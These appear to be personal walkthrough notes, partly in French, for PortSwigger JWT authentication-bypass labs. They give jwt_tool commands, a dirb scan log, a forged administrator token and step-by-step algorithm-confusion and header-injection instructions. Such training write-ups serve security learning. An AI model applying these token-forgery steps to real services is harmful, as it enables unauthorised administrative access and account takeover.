```
Lab: JWT authentication bypass via unverified signature

APPRENTICE

This lab uses a JWT-based mechanism for handling sessions. Due to implementation flaws, the server doesn't verify the signature of any JWTs that it receives.

To solve the lab, modify your session token to gain access to the admin panel at /admin, then delete the user carlos.

You can log in to your own account using the following credentials: wiener:peter 
```
- Change the algorithm from RS256 to HS256
- Change "sub" value from wiener to administrator
- Use this new crafted JWT to delete Carlos

---
```
Lab: JWT authentication bypass via flawed signature verification

APPRENTICE

This lab uses a JWT-based mechanism for handling sessions. The server is insecurely configured to accept unsigned JWTs.

To solve the lab, modify your session token to gain access to the admin panel at /admin, then delete the user carlos.

You can log in to your own account using the following credentials: wiener:peter 
```
- Change "sub" value from wiener to administrator
- python jwt_tool.py [JWT] -X a

---
```
Lab: JWT authentication bypass via weak signing key

PRACTITIONER

This lab uses a JWT-based mechanism for handling sessions. It uses an extremely weak secret key to both sign and verify tokens. This can be easily brute-forced using a wordlist of common secrets.

To solve the lab, first brute-force the website's secret key. Once you've obtained this, use it to sign a modified session token that gives you access to the admin panel at /admin, then delete the user carlos.

You can log in to your own account using the following credentials: wiener:peter 
```
- python jwt_tool.py JWT -d wordlist.lst -C
- python jwt_tool.py -T JWT -S hs256 -p "secret1"

---

```
Lab: JWT authentication bypass via jwk header injection

PRACTITIONER

This lab uses a JWT-based mechanism for handling sessions. The server supports the jwk parameter in the JWT header. This is sometimes used to embed the correct verification key directly in the token. However, it fails to check whether the provided key came from a trusted source.

To solve the lab, modify and sign a JWT that gives you access to the admin panel at /admin, then delete the user carlos.

You can log in to your own account using the following credentials: wiener:peter 
```
- jwk attack with new RSA key created

---
```
Lab: JWT authentication bypass via jku header injection

PRACTITIONER

This lab uses a JWT-based mechanism for handling sessions. The server supports the jku parameter in the JWT header. However, it fails to check whether the provided URL belongs to a trusted domain before fetching the key.

To solve the lab, forge a JWT that gives you access to the admin panel at /admin, then delete the user carlos.

You can log in to your own account using the following credentials: wiener:peter 
```
Using portswigger/JWT Editor Keys

- Generate a new RSA key and host it
- Edit JWT's data
- Replace the kid header with the one from your JWKS
- Add a jku header and sign the JWT (Don't modify header option should be checked)


---
```
Lab: JWT authentication bypass via kid header path traversal

PRACTITIONER

This lab uses a JWT-based mechanism for handling sessions. In order to verify the signature, the server uses the kid parameter in JWT header to fetch the relevant key from its filesystem.

To solve the lab, forge a JWT that gives you access to the admin panel at /admin, then delete the user carlos.

You can log in to your own account using the following credentials: wiener:peter 
```
https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/JSON%20Web%20Token#jwt-claims

Using portswigger/JWT Editor Keys
Change the key path to a file with a predictable content.
/dev/null or /proc/sys/kernel/randomize_va_space

---
```
Lab: JWT authentication bypass via algorithm confusion with no exposed key

EXPERT

This lab uses a JWT-based mechanism for handling sessions. It uses a robust RSA key pair to sign and verify tokens. However, due to implementation flaws, this mechanism is vulnerable to algorithm confusion attacks.

To solve the lab, first obtain the server's public key. Use this key to sign a modified session token that gives you access to the admin panel at /admin, then delete the user carlos.

You can log in to your own account using the following credentials: wiener:peter 
```
https://github.com/FlorianPicca/JWT-Key-Recovery
Using portswigger/JWT Editor Keys
Key confusion attack
Algo RS256 -> HS256 
Sub wiener -> administrator
Sign with pub key

---
# JWT key confusion attack
# Observations :

On se connecte et on obtient un JWT :

```
eyJraWQiOiJhMjVhODg4ZC0wYzNlLTQ0YWUtYWQ3Ny0yM2Y3YjkyYjliMzYiLCJhbGciOiJSUzI1NiJ9.eyJpc3MiOiJwb3J0c3dpZ2dlciIsInN1YiI6IndpZW5lciIsImV4cCI6MTY4MDc5NDQxMH0.HSS6zUASpl6ItvqIGFPIKzKVIDXVVupf4i7KZqRX3e5_vPx5VZIxytC9mGUgrcUwUW_5cPmvRRcm6eK2-LbOvJlGmnN6jwkm0cbZEvYAkTdCLkk8YpryQgz0Z7aI2L3hF6ztcrhBKv810gcSJ-WHG8QuiID02DyIVroCFPTiaXCS-l2K2tvRE8TusrUSRVWdXpkmNuGZW_KzYsEUNnVxlLeJnQJH249SNdXlyDILKoKcSoyKRh9-3jrQN_62SyTOVaaKo8NgtUfMNqL9bApizwngfGHVAxB8fxzgpD8de0uluNNEjP3ECzYG0Zqv7egtu18tpZ5i6ObqpK5GQtT3Vg
````

On le decode et on obtient le JWT suivant : 
```
{
  "kid": "a25a888d-0c3e-44ae-ad77-23f7b92b9b36",
  "alg": "RS256"
}
{
  "iss": "portswigger",
  "sub": "wiener",
  "exp": 1680794410
}
RSASHA256(
  base64UrlEncode(header) + "." +
  base64UrlEncode(payload),
  {PUBLIC_KEY}
  ,
  {PRIVATE KEY}
)
```

# Scan :

```bash
┌──(kali㉿kali)-[~]
└─$ dirb https://0a6400d4033edbc2812f6c1900a8000d.web-security-academy.net/ -w 2

-----------------
DIRB v2.22    
By The Dark Raver
-----------------

START_TIME: Thu Apr  6 16:44:31 2023
URL_BASE: https://0a6400d4033edbc2812f6c1900a8000d.web-security-academy.net/
WORDLIST_FILES: /usr/share/dirb/wordlists/common.txt
OPTION: Not Stopping on warning messages

-----------------

GENERATED WORDS: 4612                                                          

---- Scanning URL: https://0a6400d4033edbc2812f6c1900a8000d.web-security-academy.net/ ----
+ https://0a6400d4033edbc2812f6c1900a8000d.web-security-academy.net/admin (CODE:401|SIZE:3070)                                                                                          
+ https://0a6400d4033edbc2812f6c1900a8000d.web-security-academy.net/Admin (CODE:401|SIZE:3070)                                                                                          
+ https://0a6400d4033edbc2812f6c1900a8000d.web-security-academy.net/ADMIN (CODE:401|SIZE:3070)                                                                                          
+ https://0a6400d4033edbc2812f6c1900a8000d.web-security-academy.net/analytics (CODE:200|SIZE:0)                                                                                         
+ https://0a6400d4033edbc2812f6c1900a8000d.web-security-academy.net/favicon.ico (CODE:200|SIZE:15406)                                                                                   
+ https://0a6400d4033edbc2812f6c1900a8000d.web-security-academy.net/login (CODE:200|SIZE:3633)                                                                                          
+ https://0a6400d4033edbc2812f6c1900a8000d.web-security-academy.net/Login (CODE:200|SIZE:3633)                                                                                          
+ https://0a6400d4033edbc2812f6c1900a8000d.web-security-academy.net/logout (CODE:302|SIZE:0)                                                                                            
+ https://0a6400d4033edbc2812f6c1900a8000d.web-security-academy.net/my-account (CODE:302|SIZE:0)                                                                                        
+ https://0a6400d4033edbc2812f6c1900a8000d.web-security-academy.net/post (CODE:400|SIZE:27) 
````

- Payload all the things : 

Using portswigger/JWT Editor

    Find the public key, usually in /jwks.json or /.well-known/jwks.json
    Load it in the JWT Editor Keys tab, click New RSA Key.
    . In the dialog, paste the JWK that you obtained earlier: {"kty":"RSA","e":"AQAB","use":"sig","kid":"961a...85ce","alg":"RS256","n":"16aflvW6...UGLQ"}
    Select the PEM radio button and copy the resulting PEM key.
    Go to the Decoder tab and Base64-encode the PEM.
    Go back to the JWT Editor Keys tab and generate a New Symmetric Key in JWK format.
    Replace the generated value for the k parameter with a Base64-encoded PEM key that you just copied.
    Edit the JWT token alg to HS256 and the data.
    Click Sign and keep the option: Don't modify header

Url : https://0a6400d4033edbc2812f6c1900a8000d.web-security-academy.net/jwks.json

Result : 

```
{"keys":[{"kty":"RSA","e":"AQAB","use":"sig","kid":"a25a888d-0c3e-44ae-ad77-23f7b92b9b36","alg":"RS256","n":"pPRIZAy_zneEYQQw3JwF29H8hB0yOfg35IUsuxDKNymjPIpA5yomLbN3k0ng9PzHjZqsH_qt_B8LSjxOYB6i9UCXYl30zVIMXxzR0hNE9IpgcJ9jx9YUDI93jqzjR1WKJY1FJqj-hv2BU8Pm_e9rfBhX41eQHw1yFYp0WC2Efzuj9Zi7obfZv4vfOJIW8U0Omz5iwVRPxp_NVEVeBOFUS2z-tY15zTclTiNDGnfjHnfO2R1NxcMGRshiwV7x3Zzz_snpEH89ujQcSuF-UIrs-EOhEESL-Gd8yDnPo3-LOHno7A7XP7LrSOCZyypSF5fBdusknAJNEPOA1SN-BaJbJQ"}]}
```

# JWT Signature - Key Confusion Attack RS256 to HS256 (CVE-2016-5431)

https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/JSON%20Web%20Token

- Find the public key, usually in /jwks.json or /.well-known/jwks.json
- Load it in the JWT Editor Keys tab, click New RSA Key.
. In the dialog, paste the JWK that you obtained earlier: {"kty":"RSA","e":"AQAB","use":"sig","kid":"961a...85ce","alg":"RS256","n":"16aflvW6...UGLQ"}
- Select the PEM radio button and copy the resulting PEM key.
- Go to the Decoder tab and Base64-encode the PEM.
- Go back to the JWT Editor Keys tab and generate a New Symmetric Key in JWK format.
- Replace the generated value for the k parameter with a Base64-encoded PEM key that you just copied.
- Edit the JWT token alg to HS256 and the data.
- Click Sign and keep the option: Don't modify header


---
new token :
```
eyJraWQiOiJhMjVhODg4ZC0wYzNlLTQ0YWUtYWQ3Ny0yM2Y3YjkyYjliMzYiLCJhbGciOiJIUzI1NiJ9.eyJpc3MiOiJwb3J0c3dpZ2dlciIsInN1YiI6ImFkbWluaXN0cmF0b3IiLCJleHAiOjE2ODA3OTQ0MTB9.D2FO_ySAzhPdjn-XM4KIFgaNBls-Vin8D6CRTsSjqbw
```

```html
<a href="/admin/delete?username=wiener">Delete</a>
```

GG EZ ! :) #4W <3

---
# Recommandations :

- The PHP JOSE Library by Gree Inc. before version 2.2.1 is vulnerable to key confusion/algorithm substitution in the JWS component resulting in bypassing the signature verification via crafted tokens. 

So....

> Mettre à jours la librairie PHP JOSE : Version >= 2.2.1


---
